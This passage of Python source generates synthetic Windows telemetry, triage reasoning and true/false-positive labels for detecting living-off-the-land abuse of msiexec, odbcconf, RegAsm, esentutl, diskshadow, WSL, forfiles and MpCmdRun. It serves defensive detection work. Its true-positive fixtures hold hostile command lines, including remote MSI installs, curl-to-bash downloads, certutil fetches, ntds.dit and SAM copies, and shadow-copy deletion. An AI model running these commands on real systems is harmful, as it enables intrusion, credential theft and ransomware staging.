    prompt = (f"Windows Host Telemetry -- IT VPN Profile Deployment via cmstp.\n"
              f"  EventID=1  Image: cmstp.exe  ParentImage: MsiExec.exe\n"
              f"    CommandLine: cmstp.exe /ni /s C:\\Program Files\\VPN\\profile.inf\n"
              f"    inf_signed=YES  vendor=Cisco_Systems  no_temp_path=YES\n"
              f"  no_cmd_child=YES  no_dll_load=YES\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "IT VPN profile deployment -- signed INF from Program Files, MsiExec parent, no child shell.",
        "MsiExec parent. Signed INF from Program Files. No cmd/dll child. Change ticket.",
        "Authorized VPN profile install -- signed INF, MsiExec, no shell spawn.",
        "cmstp VPN profile -- signed, MsiExec parent, Program Files path.",
        "T1218.003 -- AUTHORIZED VPN DEPLOY. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 15. MsiexecRemoteInstall
#     Source: T1218.007 -- msiexec.exe /i <URL> downloads and installs MSI
#     Chain: msiexec /i http://attacker/payload.msi /q → download MSI → install
#            MSI can have CustomActions that execute arbitrary code as SYSTEM
#            Also: msiexec /y or /z for DLL proxy registration
#     Evidence: EventID 3 (msiexec outbound HTTP to non-Microsoft domain) +
#               EventID 11 (MSI file written to temp) +
#               EventID 7 (DLL from MSI CustomAction loaded by msiexec)
#     Admin FP: SCCM/WSUS deploying signed MSI from internal distribution point
# ═══════════════════════════════════════════════════════════════════════════════

def _msie_tp(i):
    host = _host(); user = _user()
    ext_url = f"http://{_ip_ext()}/{random.choice(['update','patch','install'])}.msi"
    tmp_msi = f"C:\\Windows\\Installer\\{''.join(random.choices('abcdef',k=8))}.msi"
    parent  = random.choice(["cmd.exe","powershell.exe","wscript.exe","EXCEL.EXE"])

    variants = [
        (f"msiexec.exe /i {ext_url} /q /norestart",
         "remote MSI download and silent install"),
        (f"msiexec.exe /y C:\\Users\\{user}\\AppData\\Local\\Temp\\payload.dll",
         "msiexec /y DLL registration proxy -- bypasses AppLocker"),
        (f"msiexec.exe /i {ext_url} TARGETDIR=C:\\Temp /quiet",
         "remote MSI with custom install dir"),
    ]
    cmdline, desc = variants[i % len(variants)]
    child_pid = _pid()

    prompt = (f"Windows Host Telemetry -- msiexec.exe LOLBAS Remote Install.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: msiexec.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  EventID=3 (Network Connection)\n"
              f"    Image: msiexec.exe  DestinationIp={_ip_ext()}  DestinationPort=80\n"
              f"    domain_not_Microsoft_not_internal=YES\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: msiexec.exe  TargetFilename: {tmp_msi}\n"
              f"  EventID=1 (CustomAction child from msiexec)\n"
              f"    Image: cmd.exe  PID={child_pid}  ParentImage: msiexec.exe\n"
              f"    (MSI CustomAction executing payload during install)")

    cot = _cot(
        "msiexec.exe installs Windows Installer packages. SCCM/WSUS deployments use it "
        "with signed MSIs from internal distribution points. Legitimate installations: "
        "no direct URL in CommandLine (SCCM caches locally first), signed MSI, no "
        "outbound HTTP from msiexec.exe at install time.",
        f"URL directly in msiexec /i CommandLine = download-and-execute. Outbound HTTP "
        f"from msiexec to external IP = MSI fetched from attacker infrastructure. "
        f"{desc}. cmd.exe child from msiexec = MSI CustomAction executing arbitrary command. "
        "No SCCM/WSUS telemetry = not a managed software deployment.",
        f"Host {host} ({user}): msiexec.exe downloaded and executed MSI from external URL. "
        f"CustomAction spawned cmd.exe.",
        f"msiexec.exe remote install confirmed -- {desc}.",
        "MITRE T1218.007 (System Binary Proxy Execution: Msiexec). "
        f"Kill cmd.exe PID={child_pid}, delete {tmp_msi}, block external IP.",
    )
    return prompt, cot, "true_positive"

def _msie_fp(i):
    prompt = (f"Windows Host Telemetry -- SCCM Authorized Software Distribution.\n"
              f"  EventID=1  Image: msiexec.exe  ParentImage: CcmExec.exe (SCCM agent)\n"
              f"    CommandLine: msiexec.exe /i C:\\Windows\\ccmcache\\pkg\\setup.msi /q\n"
              f"    msi_source=local_ccm_cache  (SCCM pre-cached -- no download)\n"
              f"    msi_signed=YES  vendor=Microsoft\n"
              f"  no_outbound_http=YES  cmdb_registered=YES  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "SCCM agent deploying pre-cached signed MSI from local cache. No download. "
        "Signed by vendor. CcmExec parent.",
        "CcmExec parent. Local ccmcache path (no URL). Signed MSI. No outbound HTTP.",
        "Authorized SCCM MSI deployment -- pre-cached, signed, no download.",
        "SCCM MSI install -- local cache, CcmExec parent, signed.",
        "T1218.007 -- AUTHORIZED SCCM DEPLOYMENT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 16. OdbcconfDLLLoad
#     Source: T1218.008 -- odbcconf.exe ODBC configuration tool loads DLLs
#     Chain: odbcconf.exe /a {REGSVR payload.dll} → DllRegisterServer called
#            OR: odbcconf.exe -f response.rsp (response file with REGSVR lines)
#            AppLocker bypass: odbcconf.exe is trusted binary, DLL runs in its context
#     Evidence: EventID 1 (odbcconf with /a {REGSVR}) +
#               EventID 7 (unsigned DLL loaded by odbcconf.exe) +
#               EventID 1 (child from odbcconf.exe if DLL spawns process)
#     Admin FP: legitimate ODBC driver registration during database client install
# ═══════════════════════════════════════════════════════════════════════════════

def _odbc_tp(i):
    host = _host(); user = _user()
    dll_path = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.dll",
        f"C:\\Users\\{user}\\Downloads\\driver.dll",
        f"C:\\ProgramData\\{''.join(random.choices('abcdef',k=4))}.dll",
    ])
    parent  = random.choice(["cmd.exe","powershell.exe","wscript.exe"])

    variants = [
        (f"odbcconf.exe /a {{REGSVR {dll_path}}}",
         "odbcconf REGSVR action loads DLL via DllRegisterServer"),
        (f"odbcconf.exe -f C:\\Users\\{user}\\AppData\\Local\\Temp\\response.rsp",
         "odbcconf response file with REGSVR action"),
    ]
    cmdline, desc = variants[i % len(variants)]
    child_pid = _pid()

    prompt = (f"Windows Host Telemetry -- odbcconf.exe LOLBAS DLL Load (AppLocker Bypass).\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: odbcconf.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"  EventID=7 (ImageLoaded)\n"
              f"    Image: odbcconf.exe  ImageLoaded: {dll_path}\n"
              f"    Signed: false  path_is_user_writable=YES\n"
              f"  EventID=1 (child from odbcconf -- DLL spawned process)\n"
              f"    Image: cmd.exe  PID={child_pid}  ParentImage: odbcconf.exe")

    cot = _cot(
        "odbcconf.exe configures ODBC data source connections. Legitimate use involves "
        "registered ODBC drivers (signed DLLs from System32 or Program Files) during "
        "database client installation. No legitimate use case requires loading an "
        "unsigned DLL from %TEMP% or Downloads.",
        f"odbcconf.exe /a {{REGSVR}} is the DllRegisterServer trigger. "
        f"Unsigned DLL {dll_path} from user-writable path = attacker payload. "
        "odbcconf is on the LOLBAS list specifically because it loads DLLs as a "
        "trusted binary, bypassing application control. "
        f"cmd.exe child from odbcconf.exe = DLL spawned shell via WScript.Shell.Run "
        "or CreateProcess.",
        f"Host {host} ({user}): odbcconf.exe AppLocker bypass -- unsigned DLL executed "
        f"via REGSVR action → cmd.exe child PID={child_pid}.",
        f"odbcconf.exe DLL load confirmed -- unsigned temp DLL + shell child.",
        "MITRE T1218.008 (System Binary Proxy Execution: Odbcconf). "
        f"Kill cmd.exe PID={child_pid}, delete {dll_path}, investigate {parent}.",
    )
    return prompt, cot, "true_positive"

def _odbc_fp(i):
    vendor = random.choice(["Microsoft SQL","Oracle","PostgreSQL"])
    prompt = (f"Windows Host Telemetry -- Authorized ODBC Driver Registration.\n"
              f"  EventID=1  Image: odbcconf.exe  ParentImage: MsiExec.exe\n"
              f"    CommandLine: odbcconf.exe /a {{REGSVR C:\\Program Files\\{vendor} ODBC Driver\\driver.dll}}\n"
              f"    dll_signed=YES  vendor={vendor}\n"
              f"  no_temp_dll=YES  no_cmd_child=YES\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        f"MsiExec registering signed {vendor} ODBC driver from Program Files. "
        "No unsigned DLL. No cmd child. Change ticket.",
        "MsiExec parent. Program Files path. Signed DLL. No cmd child.",
        f"Authorized {vendor} ODBC driver registration.",
        f"{vendor} ODBC driver install -- signed, Program Files, MsiExec.",
        "T1218.008 -- AUTHORIZED ODBC INSTALL. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 17. RegasmComBypass
#     Source: T1218.009 -- regasm.exe / regsvcs.exe .NET COM assembly registration
#     Chain: regasm.exe /u payload.dll → calls ComUnregisterFunction (arbitrary code)
#            No registry write when /u used -- AppLocker bypass via trusted .NET binary
#            regsvcs.exe variant: same /u mechanism via ServicesInstaller attribute
#     Evidence: EventID 1 (regasm/regsvcs with /u + temp DLL) +
#               EventID 7 (unsigned .NET DLL loaded from temp) +
#               EventID 1 (child from regasm/regsvcs)
#     Admin FP: legitimate COM server registration during .NET component install
# ═══════════════════════════════════════════════════════════════════════════════

def _regasm_tp(i):
    host = _host(); user = _user()
    fw   = random.choice(["v4.0.30319","v2.0.50727"])
    arch = random.choice(["","64"])
    dll  = random.choice([
        f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.dll",
        f"C:\\Users\\{user}\\Downloads\\component.dll",
    ])
    binary = random.choice(["RegAsm.exe","RegSvcs.exe"])
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    child  = random.choice(["cmd.exe","powershell.exe"])
    child_pid = _pid()

    cmdline = (f"C:\\Windows\\Microsoft.NET\\Framework{arch}\\{fw}\\{binary} /u {dll}")

    prompt = (f"Windows Host Telemetry -- {binary} .NET COM AppLocker Bypass.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: {binary}  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    /u_flag=YES  (unregister -- triggers ComUnregisterFunction arbitrary code)\n"
              f"    dll_from_user_writable_path=YES  dll_unsigned=YES\n"
              f"  EventID=7 (ImageLoaded)\n"
              f"    Image: {binary}  ImageLoaded: {dll}  Signed: false\n"
              f"  EventID=1 (child from {binary})\n"
              f"    Image: {child}  PID={child_pid}  ParentImage: {binary}\n"
              f"    (ComUnregisterFunction spawned shell via Process.Start)")

    cot = _cot(
        f"{binary} registers/unregisters .NET assemblies as COM servers. Legitimate "
        "use: signed assembly from Program Files during software installation, with "
        "MsiExec.exe parent. No legitimate use involves /u on an unsigned temp DLL.",
        f"/u flag with unsigned temp DLL = ComUnregisterFunction path exploited. "
        f"{binary} is a .NET Framework binary on the trusted list -- AppLocker "
        "allows it by default. Unsigned DLL {dll} from user-writable path executed "
        f"via trusted {binary} = AppLocker bypass. {child} child = shell spawned "
        "from ComUnregisterFunction body.",
        f"Host {host} ({user}): {binary} AppLocker bypass -- ComUnregisterFunction "
        f"path executed unsigned DLL → {child} child PID={child_pid}.",
        f"{binary} COM bypass confirmed -- /u + unsigned temp DLL + shell child.",
        "MITRE T1218.009 (System Binary Proxy Execution: Regsvcs/Regasm). "
        f"Kill {child} PID={child_pid}, delete {dll}, investigate {parent}.",
    )
    return prompt, cot, "true_positive"

def _regasm_fp(i):
    vendor = random.choice(["SAP","Oracle","Siemens"])
    prompt = (f"Windows Host Telemetry -- Authorized .NET COM Registration.\n"
              f"  EventID=1  Image: RegAsm.exe  ParentImage: MsiExec.exe\n"
              f"    CommandLine: RegAsm.exe C:\\Program Files\\{vendor}\\comserver.dll\n"
              f"    no_u_flag=YES  dll_signed=YES  vendor={vendor}\n"
              f"  no_temp_dll=YES  no_cmd_child=YES\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        f"MsiExec registering signed {vendor} .NET COM assembly. No /u flag. "
        "Program Files. Signed. No child shell.",
        "MsiExec parent. No /u. Program Files path. Signed by vendor. No child shell.",
        f"Authorized {vendor} .NET COM registration.",
        f"{vendor} COM assembly registration -- signed, MsiExec, Program Files.",
        "T1218.009 -- AUTHORIZED COM REGISTRATION. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 18. EsentutlStagingCopy
#     Source: T1105 -- esentutl.exe copies locked files via VSS or direct
#     Chain: esentutl.exe /y NTDS.dit /vss /d C:\temp\ntds.dit
#            Bypasses file locks on NTDS.dit, SYSTEM hive, SAM hive
#            Used for offline credential extraction without dcdiag/ntdsutil
#     Evidence: EventID 1 (esentutl with /vss and sensitive target) +
#               EventID 11 (ntds.dit or SAM/SYSTEM written to temp) +
#               EventID 1 (subsequent password extraction tool)
#     Admin FP: esentutl repairing corrupted Exchange/AD database (legitimate)
# ═══════════════════════════════════════════════════════════════════════════════

def _esent_tp(i):
    host = _host(); user = _user()
    targets = [
        ("C:\\Windows\\NTDS\\ntds.dit", "ntds_vss_copy", "AD password database extracted"),
        ("C:\\Windows\\System32\\config\\SAM", "sam_copy", "SAM hive copied -- local hashes"),
        ("C:\\Windows\\System32\\config\\SYSTEM", "system_hive_copy", "SYSTEM hive for SYSKEY decryption"),
    ]
    src, dest_prefix, desc = targets[i % len(targets)]
    dest = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{dest_prefix}.dit"
    parent = random.choice(["cmd.exe","powershell.exe"])

    cmdline = f"esentutl.exe /y {src} /vss /d {dest}"

    prompt = (f"Windows Host Telemetry -- esentutl.exe VSS File Copy (Credential Staging).\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: esentutl.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline}\n"
              f"    ({desc})\n"
              f"    /vss_flag=YES  (VSS shadow copy bypass to access locked file)\n"
              f"    target_is_credential_store=YES\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: esentutl.exe  TargetFilename: {dest}\n"
              f"    sensitive_file_copied_to_temp=YES\n"
              f"  subsequent_activity: impacket-secretsdump / DSInternals detected "
              f"reading {dest}")

    cot = _cot(
        "esentutl.exe is an Extensible Storage Engine utility used for database repair, "
        "defragmentation, and integrity checks. Legitimate use: exchange admins running "
        "esentutl /p on a corrupted mailbox database. It never needs to copy ntds.dit "
        "or the SAM hive -- those operations belong to ntdsutil IFM (authorized backup).",
        f"esentutl /y /vss targeting {src} = VSS-based file copy to bypass Windows file "
        "locking mechanism (ntds.dit is always locked while AD is running). "
        f"Output to {dest} (user-writable temp) instead of authorized backup location. "
        f"{desc}. No backup software context (no Veeam/BackupExec parent). "
        "Subsequent secretsdump activity confirms credential theft intent.",
        f"Host {host} ({user}): esentutl.exe copied locked {src} via VSS shadow. "
        "Credential database staged for offline extraction.",
        f"esentutl VSS file copy confirmed -- {desc}.",
        f"MITRE T1003.003 (NTDS) / T1003.002 (SAM). "
        f"Delete {dest}, investigate {parent}, assume credentials compromised.",
    )
    return prompt, cot, "true_positive"

def _esent_fp(i):
    prompt = (f"Windows Host Telemetry -- Exchange Database Repair.\n"
              f"  EventID=1  Image: esentutl.exe  ParentImage: MSExchangeIS.exe\n"
              f"    CommandLine: esentutl.exe /p C:\\Program Files\\Exchange\\Mailbox\\EDB.edb\n"
              f"    target_is_exchange_mailbox_not_credential_store=YES\n"
              f"  no_SAM_NTDS_target=YES  no_vss_flag=YES\n"
              f"  context=exchange_admin  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "Exchange admin repairing mailbox EDB. No /vss flag. Not targeting credential stores.",
        "Exchange parent. EDB target (not NTDS/SAM). No /vss. Admin context.",
        "Authorized Exchange DB repair -- no credential store target, Exchange parent.",
        "esentutl Exchange repair -- EDB target, no /vss, Exchange parent.",
        "T1105 -- AUTHORIZED DB REPAIR. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 19. DiskshadowScriptExec
#     Source: T1490, T1006 -- diskshadow.exe script mode executes arbitrary commands
#     Chain: diskshadow.exe /s script.dsh →
#            exec "cmd.exe /c payload" inside .dsh script →
#            expose shadow copy / mount ntds.dit for extraction
#            Also pre-ransomware: delete all shadow copies
#     Evidence: EventID 1 (diskshadow with /s flag + temp .dsh file) +
#               EventID 1 (child cmd.exe from diskshadow.exe) +
#               EventID 1 (vssvc.exe spawned / shadow copy manipulation)
#     Admin FP: backup admin using diskshadow for snapshot management
# ═══════════════════════════════════════════════════════════════════════════════

def _dsh_tp(i):
    host = _host(); user = _user()
    dsh_path = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.dsh"
    parent   = random.choice(["cmd.exe","powershell.exe"])
    child_pid = _pid()

    variants = [
        (f"diskshadow.exe /s {dsh_path}  [content: exec cmd.exe /c whoami > C:\\temp\\out.txt]",
         "arbitrary command execution via diskshadow exec directive"),
        (f"diskshadow.exe /s {dsh_path}  [content: expose %VSS_SHADOW_1% Z: + exec copy Z:\\Windows\\NTDS\\ntds.dit C:\\temp\\ntds.dit]",
         "VSS expose to access ntds.dit + copy credential database"),
        (f"diskshadow.exe /s {dsh_path}  [content: delete shadows all]",
         "delete all VSS shadow copies (pre-ransomware indicator)"),
    ]
    cmdline, desc = variants[i % len(variants)]

    prompt = (f"Windows Host Telemetry -- diskshadow.exe Script Mode LOLBAS Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: diskshadow.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:120]}...\n"
              f"    ({desc})\n"
              f"    /s_flag=YES  script_from_temp=YES\n"
              f"  EventID=1 (child from diskshadow.exe)\n"
              f"    Image: cmd.exe  PID={child_pid}  ParentImage: diskshadow.exe\n"
              f"    (diskshadow exec directive spawning shell)\n"
              f"  shadow_manipulation=YES  {'shadow_delete_all=YES' if 'delete' in desc else 'ntds_copied=YES'}")

    ransomware_note = " Shadow copy deletion is a universal pre-ransomware indicator." if "delete" in desc else ""

    cot = _cot(
        "diskshadow.exe manages Volume Shadow Copy Service operations -- creating, listing, "
        "deleting snapshots. It has a script mode (/s) specifically for automating VSS "
        "operations. Legitimate scripts: signed, stored in IT backup directories, "
        "no 'exec' directives (that's exclusively an attacker feature).",
        f"diskshadow /s with script from {dsh_path} (user-writable temp) = attacker-controlled "
        "script. The 'exec' directive in diskshadow .dsh scripts executes arbitrary commands "
        "inside the diskshadow context (signed trusted binary = execution proxy). "
        f"cmd.exe child from diskshadow.exe = exec directive fired. {desc}.{ransomware_note}",
        f"Host {host} ({user}): diskshadow.exe script mode used as execution proxy. "
        f"{desc}. cmd.exe child PID={child_pid}.",
        f"diskshadow script LOLBAS confirmed -- {desc}.",
        "MITRE T1490 (Inhibit System Recovery) + T1006 (Direct Volume Access). "
        f"Kill cmd.exe PID={child_pid}, delete {dsh_path}, check for subsequent tools.",
    )
    return prompt, cot, "true_positive"

def _dsh_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized VSS Snapshot Management.\n"
              f"  EventID=1  Image: diskshadow.exe  ParentImage: BackupExec.exe\n"
              f"    CommandLine: diskshadow.exe /s C:\\BackupConfig\\daily_snapshot.dsh\n"
              f"    script_signed=YES  backup_software_parent=YES\n"
              f"    script_dir=BackupConfig  (IT-controlled path, not temp)\n"
              f"  no_exec_directive=YES  no_cmd_child=YES\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "BackupExec running diskshadow for scheduled snapshot. Script from IT-controlled "
        "directory. No exec directive. No cmd child. Change ticket.",
        "BackupExec parent. IT-controlled script path. No exec directive. No cmd child.",
        "Authorized backup VSS snapshot -- BackupExec, IT path, no exec.",
        "BackupExec diskshadow snapshot -- IT path, no exec directive.",
        "T1490 -- AUTHORIZED BACKUP SNAPSHOT. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 20. WslBashBypass
#     Source: T1202 -- WSL (Windows Subsystem for Linux) bypass Windows controls
#     Chain: wsl.exe -e /bin/bash -c "curl http://attacker/payload | sh"
#            bash.exe (WSL) bypasses AMSI, AppLocker, and Windows Defender behavior
#            Files written via WSL to /mnt/c/ bypass some NTFS ACL enforcement
#     Evidence: EventID 1 (wsl.exe / bash.exe from unusual parent) +
#               EventID 3 (WSL process outbound to external IP) +
#               EventID 11 (file written via WSL bypassing Windows AV scan)
#     Admin FP: legitimate developer using WSL for coding/build tasks
# ═══════════════════════════════════════════════════════════════════════════════

def _wsl_tp(i):
    host = _host(); user = _user()
    ext_ip   = _ip_ext()
    parent   = random.choice(["WINWORD.EXE","EXCEL.EXE","cmd.exe","wscript.exe","mshta.exe"])

    variants = [
        (f"wsl.exe bash -c \"curl -s http://{ext_ip}/payload.sh | bash\"",
         "WSL download-and-execute via bash pipe (bypasses Windows AV)"),
        (f"bash.exe -c \"python3 -c 'import socket,subprocess,os; ...reverse shell...' \"",
         "WSL reverse shell via Python -- avoids Windows process tree detection"),
        (f"wsl.exe -e sh -c \"cp /mnt/c/Users/{user}/AppData/Local/Temp/p.elf /tmp/ && chmod +x /tmp/p.elf && /tmp/p.elf\"",
         "execute ELF binary staged via Windows path (bypasses PE AV scanners)"),
    ]
    cmdline, desc = variants[i % len(variants)]
    child_pid = _pid()

    prompt = (f"Windows Host Telemetry -- WSL/bash.exe Windows Control Bypass.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: {'wsl.exe' if 'wsl' in cmdline else 'bash.exe'}  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"    parent_has_no_wsl_reason=YES  (not IDE/terminal/dev tool)\n"
              f"  EventID=3 (Network Connection -- from WSL process)\n"
              f"    Image: wsl.exe (or bash/sh child)  DestinationIp={ext_ip}  DestinationPort=443\n"
              f"    WSL_network_traffic_bypasses_Windows_firewall_rules=PARTIAL\n"
              f"  EventID=11 (FileCreate by WSL -- Windows AV may not scan ELF)\n"
              f"    TargetFilename: C:\\Users\\{user}\\AppData\\Local\\Temp\\payload.elf\n"
              f"    elf_binary_not_PE=YES  Windows_Defender_partial_coverage=YES")

    cot = _cot(
        "WSL (Windows Subsystem for Linux) is used by developers to run Linux tools "
        "on Windows. Legitimate use: invoked from terminal (Windows Terminal, VSCode) "
        "by engineers, doing build/test tasks. Never invoked from Office apps or wscript.",
        f"wsl.exe/bash.exe invoked from {parent} (not a developer tool) = LOL technique. "
        f"{desc}. WSL bypasses: Windows AMSI (no .NET CLR), AppLocker rules (evaluates PE "
        "not ELF), and partial Windows Defender coverage (ELF scanning not universal). "
        f"Outbound to {ext_ip} from WSL context = C2/download confirmed.",
        f"Host {host} ({user}): WSL used to bypass Windows security controls. "
        f"Non-dev parent {parent}. External connection from bash.",
        f"WSL bypass confirmed -- {desc}.",
        "MITRE T1202 (Indirect Command Execution). "
        f"Kill WSL processes, investigate {parent}, check WSL filesystem at "
        f"\\\\wsl$\\Ubuntu for dropped files.",
    )
    return prompt, cot, "true_positive"

def _wsl_fp(i):
    prompt = (f"Windows Host Telemetry -- Developer WSL Build Task.\n"
              f"  EventID=1  Image: wsl.exe  ParentImage: WindowsTerminal.exe\n"
              f"    CommandLine: wsl.exe make -j8 all\n"
              f"    parent_is_dev_terminal=YES  no_external_network=YES\n"
              f"  machine_tag=DEV-WORKSTATION  user_group=Engineering\n"
              f"  no_ELF_download=YES")
    cot = _cot(
        "Developer running make via WSL from Windows Terminal. Dev workstation. "
        "No external network. Engineering group.",
        "WindowsTerminal parent. make command (build). No external network. "
        "Dev workstation tag.",
        "Authorized developer WSL build -- terminal parent, no network, dev machine.",
        "WSL make build -- WindowsTerminal parent, no download, dev workstation.",
        "T1202 -- AUTHORIZED DEV WSL USE. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 21. ForfilesCmdProxy
#     Source: T1202 -- forfiles.exe indirect command execution
#     Chain: forfiles /p C:\Windows\System32 /m notepad.exe /c "cmd /c whoami"
#            forfiles is used to run a command against each matched file -- the /c
#            argument executes for each match, creating indirect cmd execution
#     Evidence: EventID 1 (forfiles with /c "cmd...") +
#               EventID 1 (cmd.exe child of forfiles.exe)
#     Admin FP: forfiles for legitimate batch file operations (delete old logs)
# ═══════════════════════════════════════════════════════════════════════════════

def _forfiles_tp(i):
    host = _host(); user = _user()
    parent = random.choice(["cmd.exe","powershell.exe","wscript.exe"])
    child_pid = _pid()

    payloads = [
        (f"cmd /c powershell -enc {_b64()[:30]}", "indirect PS execution via forfiles"),
        (f"cmd /c certutil -urlcache -f http://{_ip_ext()}/p.exe %TEMP%\\p.exe",
         "download via certutil piped through forfiles"),
        (f"cmd /c whoami /all > C:\\Users\\{user}\\AppData\\Local\\Temp\\out.txt",
         "reconnaissance via forfiles indirect execution"),
    ]
    payload, desc = payloads[i % len(payloads)]
    cmdline = f"forfiles /p C:\\Windows\\System32 /m notepad.exe /c \"{payload}\""

    prompt = (f"Windows Host Telemetry -- forfiles.exe Indirect Command Execution.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: forfiles.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"    /c_arg_contains_cmd=YES  (indirect execution via file match)\n"
              f"  EventID=1 (child from forfiles.exe)\n"
              f"    Image: cmd.exe  PID={child_pid}  ParentImage: forfiles.exe\n"
              f"    (forfiles /c executes the command for each matched file -- once for notepad.exe)")

    cot = _cot(
        "forfiles.exe is used for batch file operations -- finding files matching a pattern "
        "and executing a command per file (e.g., delete logs older than 30 days). "
        "Legitimate /c commands: 'cmd /c del @file' or 'cmd /c echo @fname'. "
        "They never download payloads or execute encoded PowerShell.",
        f"forfiles /c '{payload}' = execution proxy technique. /p C:\\Windows\\System32 "
        "/m notepad.exe matches notepad.exe (a known file that always exists) -- this is "
        "a reliable trick to guarantee exactly one execution. "
        f"cmd.exe child from forfiles.exe = {desc}. No file management rationale.",
        f"Host {host} ({user}): forfiles.exe used as execution proxy → cmd.exe child PID={child_pid}.",
        f"forfiles.exe indirect execution confirmed -- {desc}.",
        "MITRE T1202 (Indirect Command Execution). "
        f"Kill cmd.exe PID={child_pid}, investigate {parent}.",
    )
    return prompt, cot, "true_positive"

def _forfiles_fp(i):
    prompt = (f"Windows Host Telemetry -- Authorized Log Cleanup via forfiles.\n"
              f"  EventID=1  Image: forfiles.exe  ParentImage: svchost.exe (Task Scheduler)\n"
              f"    CommandLine: forfiles /p C:\\Logs /m *.log /d -30 /c \"cmd /c del @file\"\n"
              f"    /c_command=del_only  no_download=YES  no_PS_encoded=YES\n"
              f"  triggered_by_scheduled_task=YES  task_name=LogCleanup\n"
              f"  change_ticket=CHG-{random.randint(10000,99999)}")
    cot = _cot(
        "Scheduled log cleanup -- forfiles deleting old logs. 'del @file' only. "
        "No download, no PS. Task Scheduler parent.",
        "Task Scheduler parent. 'del @file' only (no download/exec). Logs directory. "
        "Scheduled task context.",
        "Authorized log cleanup via forfiles -- del only, scheduler, no exec.",
        "forfiles log cleanup -- del @file only, scheduler parent.",
        "T1202 -- AUTHORIZED LOG CLEANUP. No action.",
        action="dismiss",
    )
    return prompt, cot, "false_positive"


# ═══════════════════════════════════════════════════════════════════════════════
# 22. MpCmdRunDownload
#     Source: T1105 -- MpCmdRun.exe Windows Defender binary used as downloader
#     Chain: MpCmdRun.exe -DownloadFile -url <URL> -path <local_path>
#            Windows Defender binary downloads arbitrary files -- bypasses content filters
#            that allow MpCmdRun.exe through (it's a Windows security binary)
#     Evidence: EventID 1 (MpCmdRun with -DownloadFile) +
#               EventID 3 (MpCmdRun outbound HTTP to non-Microsoft IP) +
#               EventID 11 (non-definition-update file written by MpCmdRun)
#     Admin FP: MpCmdRun downloading definition updates from Microsoft
# ═══════════════════════════════════════════════════════════════════════════════

def _mpcmd_tp(i):
    host = _host(); user = _user()
    ext_url = f"http://{_ip_ext()}/{random.choice(['tool','payload','update'])}.{random.choice(['exe','ps1','dll','bat'])}"
    dest    = f"C:\\Users\\{user}\\AppData\\Local\\Temp\\{''.join(random.choices('abcdef',k=6))}.exe"
    parent  = random.choice(["cmd.exe","powershell.exe","wscript.exe"])

    variants = [
        (f"MpCmdRun.exe -DownloadFile -url {ext_url} -path {dest}",
         "MpCmdRun as downloader -- bypasses proxy content filters that trust Defender binary"),
        (f"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.2406.9-0\\MpCmdRun.exe "
         f"-DownloadFile -url {ext_url} -path {dest}",
         "MpCmdRun from versioned path -- harder to block by path"),
    ]
    cmdline, desc = variants[i % len(variants)]
    child_pid = _pid()

    prompt = (f"Windows Host Telemetry -- MpCmdRun.exe LOLBAS Downloader.\n"
              f"Host: {host}  User: {user}\n"
              f"  EventID=1 (Process Create)\n"
              f"    Image: MpCmdRun.exe  ParentImage: {parent}\n"
              f"    CommandLine: {cmdline[:100]}...\n"
              f"    ({desc})\n"
              f"    -DownloadFile_flag=YES\n"
              f"  EventID=3 (Network Connection)\n"
              f"    Image: MpCmdRun.exe  DestinationIp={ext_url.split('/')[2]}  DestinationPort=80\n"
              f"    destination_not_Microsoft_update_server=YES\n"
              f"  EventID=11 (FileCreate)\n"
              f"    Image: MpCmdRun.exe  TargetFilename: {dest}\n"
